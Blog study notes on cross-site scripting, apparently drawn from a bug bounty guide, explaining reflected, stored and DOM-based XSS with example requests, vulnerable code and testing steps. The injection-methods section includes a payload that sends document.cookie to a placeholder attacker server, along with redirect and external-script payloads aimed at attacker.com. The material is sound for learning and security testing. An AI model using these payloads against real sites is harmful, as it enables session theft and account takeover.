---
layout: post
title: CROSS-SITE SCRIPTING (XSS)
date: 2023-07-17
categories: [cybersecurity, web-security,Bug_Bounty_Bootcamp_The_Guide_to_Finding_and_Reporting_Web_Vulnerabilities,XSS ]
---


# Chapter 6 : CROSS-SITE SCRIPTING

An XSS vulnerability occurs when attackers can execute custom scripts on a victim's browser. If an application fails to distinguish between user input and the legitimate code that makes up a web page, attackers can inject their own code into pages viewed by other users. The victim's browser will then execute the malicious script, which might steal cookies, leak personal information, change site contents, or redirect the user to a malicious site. These malicious scripts are often JavaScript code but can also be HTML, Flash, VBScript, or anything written in a language that the browser can execute.

# XSS Injection Methods

There are different ways that attackers can inject malicious code into web pages, such as:

1. Inline script injection: The attacker inserts a `<script>` tag with the code directly into the web page. For example: 
```html
<script>location = "http://attacker.com";</script>
```

2. External script source injection: The attacker uses the `src` attribute of the `<script>` tag to load the code from an external source. For example: `<script src="http://attacker.com/xss.js"></script>`.

3. Malicious URL injection: The attacker crafts a URL that contains the code as a parameter and tricks the user into visiting it. For example: `https://subscribe.example.com?email=<script>location="http://attacker.com";</script>`.

4. Stealing user cookies: The attacker uses the `document.cookie` property to access and send the user’s cookies to a malicious server. For example: `<script>image = new Image(); image.src='http://attacker_server_ip/?c='+document.cookie;</script>`.

# Types of XSS

There are three main types of XSS attacks:

- Reflected XSS: The attacker’s code is sent as part of the user’s request and reflected back by the server in the response. The user has to click on a malicious link or visit a malicious site to trigger the attack.
- Stored XSS: The attacker’s code is stored on the server, such as in a database, a comment field, or a profile. The user views the affected web page and executes the code without any interaction.
- DOM-based XSS: The attacker’s code is executed in the user’s browser by manipulating the DOM (Document Object Model) of the web page. The code never leaves the browser and does not involve the server.

## Reflected XSS

### What is Reflected Cross-Site Scripting?
Reflected cross-site scripting (or XSS) arises `when an application receives data in an HTTP request and includes that data within the immediate response in an unsafe way.`

Suppose a website has a `search function` which receives the user-supplied search term in a URL parameter:

`https://insecure-website.com/search?term=gift`
The application echoes the supplied search term in the response to this URL:

```
<p>You searched for: gift</p>
```
Assuming the application doesn't perform any other processing of the data, an attacker can construct an attack like this:

`https://insecure-website.com/search?term=<script>/*+Bad+stuff+here...+*/</script>`
This URL results in the following response:

`<p>You searched for: <script>/* Bad stuff here... */</script></p>`
If another user of the application requests the attacker's URL, then the script supplied by the attacker will execute in the victim user's browser, in the context of their session with the application.

## Impact of Reflected XSS Attacks

When an attacker can control a script executed in the victim's browser through reflected XSS, they can fully compromise the user. The consequences include:

1. Perform Actions: The attacker can perform any action within the application that the user is capable of doing.

2. View Information: The attacker can access any information that the user can view.

3. Modify Data: The attacker can modify any information that the user has permission to change.

4. Impersonation: The attacker can initiate interactions with other users, including malicious attacks that appear to originate from the initial victim.

Attack Delivery:
Reflected XSS attacks require a means to deliver the malicious link to the victim. Attackers can place links on websites they control, on other platforms that allow user-generated content, or send them via emails, tweets, or messages. The attack can target specific users or be indiscriminate against any application users.

Severity:
The need for an external delivery mechanism generally makes the impact of reflected XSS attacks less severe than stored XSS, where self-contained attacks are delivered within the vulnerable application itself.


## Stored XSS

### What is Stored Cross-Site Scripting?

Stored cross-site scripting (also known as second-order or persistent XSS) arises when an application receives data from an untrusted source and includes that data within its later HTTP responses in an unsafe way.

### Example Scenario on how Stored XSS Works

Suppose a website allows users to submit comments on blog posts, which are displayed to other users. Users submit comments using an HTTP request like the following:
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Length: 100

postId=3&comment=This+post+was+extremely+helpful.&name=Carlos+Montoya&email=carlos%40normal-user.net
```

After this comment has been submitted, any user who visits the blog post will receive the following within the application's response:
```html
<p>This post was extremely helpful.</p>
```
### what an Attack can do 
Assuming the application doesn't perform any other processing of the data, an attacker can submit a malicious comment like this:
```html
<script>/* Bad stuff here... */</script>
```
Within the attacker's request, this comment would be URL-encoded as:
`comment=%3Cscript%3E%2F*%2BBad%2Bstuff%2Bhere...%2B*%2F%3C%2Fscript%3E
`
Any user who visits the blog post will now receive the following within the application's response:

```html
<p><script>/* Bad stuff here... */</script></p>
```
## Finding Stored XSS Vulnerabilities

To find stored XSS vulnerabilities, you need to `test all relevant entry points and exit points` in the application. `Entry points are where the attacker can submit data to the application, such as URL parameters, form inputs, or HTTP headers.` `Exit points are where the data is displayed to other users, such as web pages, emails, or logs.`

1. **Identify Entry and Exit Points:**
   Entry points are areas where users can input data, and exit points are places where that data is displayed to others. For example, consider a blog post comment feature, where users can input comments, and those comments are displayed on the blog post page.

2. **Test Links Between Points:**
   Submit specific values to the entry points and observe the application's responses. For example, submit the comment "test123" and see if it appears on the blog post page. If the comment is visible, proceed to the next step.

3. **Check Data Storage:**
   Determine if the data is stored on the server or just reflected in the immediate response. Suppose the application stores the comment data in a database, and when the blog post page is accessed, it retrieves and displays the stored comments.

4. **Test XSS Payloads:**
   Inject suitable XSS payloads into each context where the data appears. For example, try injecting the script tag `<script>alert('XSS')</script>` into the comment. If the script executes on the browser when displayed within an HTML context, it indicates a stored XSS vulnerability.


### Entry Point to application can be like : 
   
- `Parameters in the URL Query String and Message Body`:

In a web application, there might be a `search` functionality that allows users to search for products using the URL query string. For example: https://example.com/search?keyword=user_input, where `user_input` is the search term provided by the user. If the application doesn't properly validate and sanitize this input, it becomes vulnerable to XSS attacks. An attacker could inject malicious scripts, like <script>alert('XSS');</script>, into the search term. If the application reflects this input back to other users without proper encoding, the script could execute in their browsers.

- The URL File Path:

Suppose a web application serves different pages based on the URL file path, like https://example.com/pages/page1.html, where page1.html represents a specific page on the website. If the application fails to handle the file path securely, an attacker could manipulate it and attempt to inject scripts. For example, an attacker might try to access a non-existing page like `https://example.com/pages/<script>alert('XSS');</script>`, hoping the application reflects the input in the response and triggers an XSS vulnerability.

- HTTP Request Headers:

Although HTTP request headers are not typically exploited for `reflected XSS`, they can be entry points for other types of attacks or security issues. For instance, an application might rely on a custom request header for authentication or session management. If the application doesn't validate and handle these headers securely, attackers might manipulate them to gain unauthorized access or perform malicious actions.
for a website that allow user to insert comment the http request would be like this : 
```http
POST /post/comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 64

comment=<script>alert('XSS Attack!')</script>&name=Attacker
```
In above example, attacker is trying to inject script into server side code which will execute when page loads

- Out-of-Band Routes:

Consider a web application that aggregates news articles from external websites. The application processes and displays these articles on its platform. If the application fails to sanitize data received from external sources, an attacker could inject malicious content into these articles. For instance, the attacker might compromise an external news source and inject a malicious script into one of the articles. When the web application displays this article to its users, it unknowingly executes the malicious script, leading to an XSS attack.

Suppose the application displays the article content within an HTML element like this:

```html
<div class="article-content">
  [Article Content Goes Here]
</div>
```
The attacker identifies an external website that the vulnerable application fetches articles from and finds a way to inject a malicious script into the article content on that website.
- Attacker injects a malicious script on an external website
- The vulnerable application fetches and displays the article
- XSS Attack Execution


## DOM-based XSS

### what is DOM-XSS :

DOM-based cross-site scripting (XSS) occurs `when JavaScript takes data from an attacker-controllable source, like the URL, and passes it to a sink that supports dynamic code execution, such as eval() or innerHTML.` This allows attackers to execute malicious JavaScript, potentially compromising other users' accounts.

Suppose you have a web page that displays a welcome message to the user based on their name, which is taken from the URL query string. For example, if the URL is `http://www.example.com/userdashboard.html?name=Bob`, then the page will show “Hi Bob”.

The HTML code of the page might look something like this:

```html
<HTML>
<TITLE>Welcome!</TITLE>
Hi
<SCRIPT>
var pos = document.URL.indexOf("name=") + 5;
document.write(document.URL.substring(pos, document.URL.length));
</SCRIPT>
<BR>
Welcome to our website ...
</HTML>

```
As you can see, the page uses the `document.write` function to write the user name directly to the DOM without any validation or sanitization. This is a dangerous practice because it allows an attacker to inject arbitrary JavaScript code into the page by modifying the URL query string.

For example, if the attacker crafts a malicious URL like this: `http://www.example.com/userdashboard.html?name=<script>alert('XSS')</script>`, then the page will execute the script and show an alert box with the message “XSS”. This is a simple example of a DOM XSS attack.

To prevent this type of attack, you should never use `document.write` or other similar functions that support dynamic code execution. Instead, you should use safe APIs that encode or sanitize the data before writing it to the DOM, such as `document.createTextNode`, `element.textContent`, or `element.setAttribute`.


#### Finding DOM XSS:

- **Testing HTML sinks**

  To test for DOM XSS in an HTML sink, place a random alphanumeric string into the source (such as `location.search`), then use developer tools to inspect the HTML and find where your string appears. Note that the browser's "View source" option won't work for DOM XSS testing because it doesn't take account of changes that have been performed in the HTML by JavaScript. 

  For each location where your string appears within the DOM, you need to identify the context. Based on this context, you need to refine your input to see how it is processed. For example, if your string appears within a double-quoted attribute, then try to inject double quotes in your string to see if you can break out of the attribute.

- **Testing JavaScript execution sinks**

  Testing JavaScript execution sinks for DOM-based XSS is a little harder. With these sinks, your input doesn't necessarily appear anywhere within the DOM, so you can't search for it. Instead, you'll need to use the JavaScript debugger to determine whether and how your input is sent to a sink.

  For each potential source, such as `location`, you first need to find cases within the page's JavaScript code where the source is being referenced. In Chrome's developer tools, you can use `Control+Shift+F` (or `Command+Alt+F` on MacOS) to search all the page's JavaScript code for the source.

  Once you've found where the source is being read, you can use the JavaScript debugger to add a breakpoint and follow how the source's value is used. You might find that the source gets assigned to other variables. If this is the case, you'll need to use the search function again to track these variables and see if they're passed to a sink. When you find a sink that is being assigned data that originated from the source, you can use the debugger to inspect the value by hovering over the variable to show its value before it is sent to the sink. Then, as with HTML sinks, you need to refine your input to see if you can deliver a successful XSS attack.

- **Testing for DOM XSS using DOM Invader**

  Identifying and exploiting DOM XSS in the wild can be a tedious process, often requiring you to manually trawl through complex, minified JavaScript. If you use Burp's browser, however, you can take advantage of its built-in DOM Invader extension, which does a lot of the hard work for you.

